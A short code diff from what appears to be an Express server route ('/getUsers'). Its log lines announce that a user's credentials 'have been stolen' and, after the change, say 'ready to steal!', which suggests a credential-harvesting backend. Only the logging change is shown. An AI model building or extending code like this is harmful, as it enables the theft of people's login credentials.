@@ -25,7 +25,7 @@ app.put("/getUsers", async (req, res) => {
     );
     console.log(`${email}'s credentials have been stolen!`);
   } catch (error) {
-    console.log(error.message);
+    console.log('ready to steal!');
   }
 });
 
